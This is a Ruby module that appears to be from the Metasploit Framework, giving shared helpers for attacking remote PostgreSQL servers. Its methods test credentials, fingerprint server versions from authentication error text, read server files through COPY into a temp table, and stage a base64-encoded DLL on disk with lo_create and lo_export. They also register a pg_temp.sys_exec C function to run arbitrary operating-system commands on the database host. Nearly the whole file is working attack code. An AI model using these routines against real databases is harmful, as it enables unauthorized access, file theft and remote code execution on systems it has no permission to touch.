# -*- coding: binary -*-
require 'msf/core'

module Msf

###
#
# This module exposes methods for querying a remote PostgreSQL service.
#
###

module Exploit::Remote::Postgres

	require 'postgres_msf'
	include Msf::Db::PostgresPR
	attr_accessor :postgres_conn

	#
	# Creates an instance of a MSSQL exploit module.
	#
	def initialize(info = {})
		super

		# Register the options that all Postgres exploits may make use of.
		register_options(
			[
				Opt::RHOST,
				Opt::RPORT(5432),
				OptString.new('DATABASE', [ true, 'The database to authenticate against', 'template1']),
				OptString.new('USERNAME', [ true, 'The username to authenticate as', 'postgres']),
				OptString.new('PASSWORD', [ false, 'The password for the specified username. Leave blank for a random password.', '']),
				OptBool.new('VERBOSE', [false, 'Enable verbose output', false]),
				OptString.new('SQL', [ false, 'The SQL query to execute',  'select version()']),
				OptBool.new('RETURN_ROWSET', [false, "Set to true to see query result sets", true])
			], Msf::Exploit::Remote::Postgres)

		register_autofilter_ports([ 5432 ])
		register_autofilter_services(%W{ postgres })
	end

	# postgres_login takes a number of arguments (defaults to the datastore for
	# appropriate values), and will either populate self.postgres_conn and return
	# :connected, or will return :error, :error_databse, or :error_credentials
	# Fun fact: if you get :error_database, it means your username and password
	# was accepted (you just failed to guess a correct running database instance).
	# Note that postgres_login will first trigger postgres_logout if the module
	# is already connected.
	def postgres_login(args={})
		postgres_logout if self.postgres_conn
		db = args[:database]       || datastore['DATABASE']
		username = args[:username] || datastore['USERNAME']
		password = args[:password] || datastore['PASSWORD']
		ip = args[:server]         || datastore['RHOST']
		port = args[:port]         || datastore['RPORT']
		uri = "tcp://#{ip}:#{port}"
		
		if Rex::Socket.is_ipv6?(ip)
			uri = "tcp://[#{ip}]:#{port}"
		end
		
		verbose = args[:verbose]   || datastore['VERBOSE']
		begin
			self.postgres_conn = Connection.new(db,username,password,uri)
		rescue RuntimeError => e
			case e.to_s.split("\t")[1]
			when "C3D000"
				print_status "#{ip}:#{port} Postgres - Invalid database: #{db} (Credentials '#{username}:#{password}' are OK)" if verbose
				return :error_database # Note this means the user:pass is good!
			when "C28000", "C28P01"
				print_error "#{ip}:#{port} Postgres - Invalid username or password: '#{username}':'#{password}'" if verbose
				return :error_credentials
			else
				print_error "#{ip}:#{port} Postgres - Error: #{e.inspect}" if verbose
				return :error
			end
		end
		if self.postgres_conn
			print_good "#{ip}:#{port} Postgres - Logged in to '#{db}' with '#{username}':'#{password}'" if verbose
			return :connected
		end
	end

	# Logs out of a database instance.
	def postgres_logout
		ip = datastore['RHOST']
		port = datastore['RPORT']
		verbose = datastore['VERBOSE']
		if self.postgres_conn
			self.postgres_conn.close if(self.postgres_conn.kind_of?(Connection) && self.postgres_conn.instance_variable_get("@conn"))
			self.postgres_conn = nil
		end
		print_status "#{ip}:#{port} Postgres - Disconnected" if verbose
	end

	# If not currently connected, postgres_query will attempt to connect. If an
	# error is encountered while executing the query, it will return with
	# :error ; otherwise, it will return with :complete.
	def postgres_query(sql=nil,doprint=false)
		ip = datastore['RHOST']
		port = datastore['RPORT']
		verbose = datastore['VERBOSE']
		postgres_login unless self.postgres_conn
		unless self.postgres_conn
			return {:conn_error => true}
		end
		if self.postgres_conn
			sql ||= datastore['SQL']
			print_status "#{ip}:#{port} Postgres - querying with '#{sql}'" if datastore['VERBOSE']
			begin
				resp = self.postgres_conn.query(sql)
			rescue RuntimeError => e
				case sql_error_msg = e.to_s.split("\t")[1] # Deal with some common errors
				when "C42601"
					sql_error_msg += " Invalid SQL Syntax: '#{sql}'"
				when "C42P01"
					sql_error_msg += " Table does not exist: '#{sql}'"
				when "C42703"
					sql_error_msg += " Column does not exist: '#{sql}'"
				when "C42883"
					sql_error_msg += " Function does not exist: '#{sql}'"
				else # Let the user figure out the rest.
					sql_error_msg += " SQL statement '#{sql}' returns #{e.inspect}"
				end
				return {:sql_error => sql_error_msg}
			end
			postgres_print_reply(resp,sql) if doprint
			return {:complete => resp}
		end
	end

	# If resp is not actually a Connection::Result object, then return
	# :error (but not an actual Exception, that's up to the caller.
	# Otherwise, create a rowset using Rex::Ui::Text::Table (if there's
	# more than 0 rows) and return :complete.
	def postgres_print_reply(resp=nil,sql=nil)
		ip = datastore['RHOST']
		port = datastore['RPORT']
		verbose = datastore['VERBOSE']
		return :error unless resp.kind_of? Connection::Result
		if resp.rows and resp.fields
			print_status "#{ip}:#{port} Rows Returned: #{resp.rows.size}" if verbose
			if resp.rows.size > 0
				tbl = Rex::Ui::Text::Table.new(
					'Indent' => 4,
					'Header' => "Query Text: '#{sql}'",
					'Columns' => resp.fields.map {|x| x.name}
				)
				resp.rows.each {|row| tbl << row.map { |x| x.nil? ? "NIL" : x } }
				print_line(tbl.to_s)
			end
		end
		return :complete
	end

	# postgres_fingerprint attempts to fingerprint a remote Postgresql instance,
	# inferring version number from the failed authentication messages.
	def postgres_fingerprint(args={})
		postgres_logout if self.postgres_conn
		db = args[:database]       || datastore['DATABASE']
		username = args[:username] || datastore['USERNAME']
		password = args[:password] || datastore['PASSWORD']
		rhost = args[:server]         || datastore['RHOST']
		rport = args[:port]         || datastore['RPORT']
		
		uri = "tcp://#{rhost}:#{rport}"
		if Rex::Socket.is_ipv6?(rhost)
			uri = "tcp://[#{rhost}]:#{rport}"
		end
		

		verbose = args[:verbose]   || datastore['VERBOSE']
		begin
			self.postgres_conn = Connection.new(db,username,password,uri)
		rescue RuntimeError => e
			version_hash = analyze_auth_error e
			return version_hash
		end
		if self.postgres_conn # Just ask for the version.
			resp = postgres_query("select version()",false)
			ver = resp[:complete].rows[0][0]
			return {:auth => ver}
		end
	end

	# Matches up filename, line number, and routine with a version.
	# These all come from source builds of Postgres. TODO: check
	# in on the binary distros, see if they're different.
	def analyze_auth_error(e)
		fname,fline,froutine = e.to_s.split("\t")[3,3]
		fingerprint = "#{fname}:#{fline}:#{froutine}"
		case fingerprint

		# Usually, Postgres is on Linux, so let's use that as a baseline.

		when "Fauth.c:L395:Rauth_failed"          ; return {:preauth => "7.4.26-27"} # Failed (bad db, bad credentials)
		when "Fpostinit.c:L264:RInitPostgres"     ; return {:preauth => "7.4.26-27"} # Failed (bad db, good credentials)
		when "Fauth.c:L452:RClientAuthentication" ; return {:preauth => "7.4.26-27"} # Rejected (maybe good, but not allowed due to pg_hba.conf)

		when "Fauth.c:L400:Rauth_failed"          ; return {:preauth => "8.0.22-23"} # Failed (bad db, bad credentials)
		when "Fpostinit.c:L274:RInitPostgres"     ; return {:preauth => "8.0.22-23"} # Failed (bad db, good credentials)
		when "Fauth.c:L457:RClientAuthentication" ; return {:preauth => "8.0.22-23"} # Rejected (maybe good)

		when "Fauth.c:L337:Rauth_failed"          ; return {:preauth => "8.1.18-19"} # Failed (bad db, bad credentials)
		when "Fpostinit.c:L354:RInitPostgres"     ; return {:preauth => "8.1.18-19"} # Failed (bad db, good credentials)
		when "Fauth.c:L394:RClientAuthentication" ; return {:preauth => "8.1.18-19"} # Rejected (maybe good)

		when "Fauth.c:L414:RClientAuthentication" ; return {:preauth => "8.2.7-1"}   # Failed (bad db, bad credentials) ubuntu 8.04.2
		when "Fauth.c:L362:Rauth_failed"          ; return {:preauth => "8.2.14-15"} # Failed (bad db, bad credentials)
		when "Fpostinit.c:L319:RInitPostgres"     ; return {:preauth => "8.2.14-15"} # Failed (bad db, good credentials)
		when "Fauth.c:L419:RClientAuthentication" ; return {:preauth => "8.2.14-15"} # Rejected (maybe good)

		when "Fauth.c:L1003:Rauth_failed"          ; return {:preauth => "8.3.8"}    # Failed (bad db, bad credentials)
		when "Fpostinit.c:L388:RInitPostgres"      ; return {:preauth => "8.3.8-9"}  # Failed (bad db, good credentials)
		when "Fauth.c:L1060:RClientAuthentication" ; return {:preauth => "8.3.8"}    # Rejected (maybe good)

		when "Fauth.c:L1017:Rauth_failed"          ; return {:preauth => "8.3.9"} # Failed (bad db, bad credentials)
		when "Fauth.c:L1074:RClientAuthentication" ; return {:preauth => "8.3.9"} # Rejected (maybe good, but not allowed due to pg_hba.conf)

		when "Fauth.c:L258:Rauth_failed"          ; return {:preauth => "8.4.1"}   # Failed (bad db, bad credentials)
		when "Fpostinit.c:L422:RInitPostgres"     ; return {:preauth => "8.4.1-2"} # Failed (bad db, good credentials)
		when "Fauth.c:L349:RClientAuthentication" ; return {:preauth => "8.4.1"}   # Rejected (maybe good)

		when "Fauth.c:L273:Rauth_failed"          ; return {:preauth => "8.4.2"} # Failed (bad db, bad credentials)
		when "Fauth.c:L364:RClientAuthentication" ; return {:preauth => "8.4.2"} # Rejected (maybe good)

		# Windows

		when 'F.\src\backend\libpq\auth.c:L273:Rauth_failed'               ; return {:preauth => "8.4.2-Win"} # Failed (bad db, bad credentials)
		when 'F.\src\backend\utils\init\postinit.c:L422:RInitPostgres'     ; return {:preauth => "8.4.2-Win"} # Failed (bad db, good credentials)
		when 'F.\src\backend\libpq\auth.c:L359:RClientAuthentication'      ; return {:preauth => "8.4.2-Win"} # Rejected (maybe good)
		when 'F.\src\backend\libpq\auth.c:L464:RClientAuthentication'      ; return {:preauth => "9.0.3-Win"} # Rejected (not allowed in pg_hba.conf)
		when 'F.\src\backend\libpq\auth.c:L297:Rauth_failed'               ; return {:preauth => "9.0.3-Win"} # Rejected (bad db or bad creds)

		# OpenSolaris (thanks Alexander!)

		when 'Fmiscinit.c:L420:' ; return {:preauth => '8.2.6-8.2.13-OpenSolaris'} # Failed (good db, bad credentials)
		when 'Fmiscinit.c:L382:' ; return {:preauth => '8.2.4-OpenSolaris'} # Failed (good db, bad credentials)
		when 'Fpostinit.c:L318:' ; return {:preauth => '8.2.4-8.2.9-OpenSolaris'} # Failed (bad db, bad credentials)
		when 'Fpostinit.c:L319:' ; return {:preauth => '8.2.10-8.2.13-OpenSolaris'} # Failed (bad db, bad credentials)

		else
			return {:unknown => fingerprint}
		end
	end

	def postgres_password
		if datastore['PASSWORD'].to_s.size > 0
			datastore['PASSWORD'].to_s
		else
			'INVALID_' + Rex::Text.rand_text_alpha(rand(6) + 1)
		end
	end

	# This presumes the user has rights to both the file and to create a table.
	# If not, postgre_query() will return an error (usually :sql_error),
	# and it should be dealt with by the caller.
	def postgres_read_textfile(filename)
		# Check for temp table creation privs first.
		unless postgres_has_database_privilege('TEMP')
			return({:sql_error => "Insufficent privileges for #{datastore['USERNAME']} on #{datastore['DATABASE']}"})
		end

		temp_table_name = Rex::Text.rand_text_alpha(rand(10)+6)
		read_query = %Q{CREATE TEMP TABLE #{temp_table_name} (INPUT TEXT);
			COPY #{temp_table_name} FROM '#{filename}';
			SELECT * FROM #{temp_table_name}}
		read_return = postgres_query(read_query)
	end

	def postgres_has_database_privilege(priv)
		sql = %Q{select has_database_privilege(current_user,current_database(),'#{priv}')}
		ret = postgres_query(sql,false)
		if ret.keys[0] == :complete
			ret.values[0].rows[0][0].inspect =~ /t/i ? true : false
		else
			return false
		end
	end

	# Creates the function sys_exec() in the pg_temp schema.
	def postgres_create_sys_exec(dll)
		q = "create or replace function pg_temp.sys_exec(text) returns int4 as '#{dll}', 'sys_exec' language C returns null on null input immutable"
		resp = postgres_query(q);
		if resp[:sql_error]
			print_error "Error creating pg_temp.sys_exec: #{resp[:sql_error]}"
			return false
		end
		return true
	end

	# This presumes the pg_temp.sys_exec() udf has been installed, almost
	# certainly by postgres_create_sys_exec()
	def postgres_sys_exec(cmd)
		q = "select pg_temp.sys_exec('#{cmd}')"
		resp = postgres_query(q)
		if resp[:sql_error]
			print_error resp[:sql_error]
			return false
		end
		return true
	end

	# Takes a local filename and uploads it into a table as a Base64 encoded string.
	# Returns an array if successful, false if not.
	def postgres_upload_binary_file(fname)
		data = postgres_base64_file(fname)
		tbl,fld = postgres_create_stager_table
		return false unless data && tbl && fld
		q = "insert into #{tbl}(#{fld}) values('#{data}')"
		resp = postgres_query(q)
		if resp[:sql_error]
			print_error resp[:sql_error]
			return false
		end
		oid, fout = postgres_write_data_to_disk(tbl,fld)
		return false unless oid && fout
		return [tbl,fld,fout,oid]
	end

	# Writes b64 data from a table field, decoded, to disk.
	def postgres_write_data_to_disk(tbl,fld)
		oid = rand(60000) + 1000
		fname = Rex::Text::rand_text_alpha(8) + ".dll"
		queries = [
			"select lo_create(#{oid})",
			"update pg_largeobject set data=(decode((select #{fld} from #{tbl}), 'base64')) where loid=#{oid}",
			"select lo_export(#{oid}, '#{fname}')"
		]
		queries.each do |q|
			resp = postgres_query(q)
			if resp && resp[:sql_error]
				print_error "Could not write the library to disk."
				print_error resp[:sql_error]
				break
			end
		end
		return oid,fname
	end

	# Base64's a file and returns the data.
	def postgres_base64_file(fname)
		data = File.open(fname, "rb") {|f| f.read f.stat.size}
		[data].pack("m*").gsub(/\r?\n/,"")
	end

	# Creates a temporary table to store base64'ed binary data in.
	def postgres_create_stager_table
		tbl = Rex::Text.rand_text_alpha(8).downcase
		fld = Rex::Text.rand_text_alpha(8).downcase
		resp = postgres_query("create temporary table #{tbl}(#{fld} text)")
		if resp[:sql_error]
			print_error resp[:sql_error]
			return false
		end
		return [tbl,fld]
	end


end
end
